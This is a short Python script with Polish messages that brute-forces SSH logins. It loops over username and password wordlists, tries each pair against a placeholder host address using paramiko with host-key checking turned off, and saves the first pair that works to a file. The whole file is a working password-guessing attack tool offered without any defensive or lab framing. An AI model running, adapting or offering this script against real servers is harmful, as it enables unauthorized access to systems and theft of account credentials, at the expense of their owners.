import paramiko


def logging_ssh(hostname, username, password):
    ssh_session = paramiko.SSHClient()
    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_session.connect(hostname=hostname, username=username, password=password, timeout=3)
        print(username, password)
        return True
    except paramiko.ssh_exception.AuthenticationException:
        print("Nie poprawne haslo lub login")
        ssh_session.close()
        return False


hostname = "wprowadz_ip"
usernames = []
passwords = []
with open("usernames.txt", encoding="UTF-8") as f:
    for line in f.readlines():
        usernames.append(line.strip().lower())
with open("passwords.txt", encoding="UTF-8") as f:
    for line in f.readlines():
        passwords.append(line.strip().lower())
for username in usernames:
    for password in passwords:
        if logging_ssh(hostname, username, password):
            with open(f"data/password_to_{username}.txt", "w", encoding="utf-8") as f:
                f.write(f"login: {username}\nPassword: {password}")
            exit()
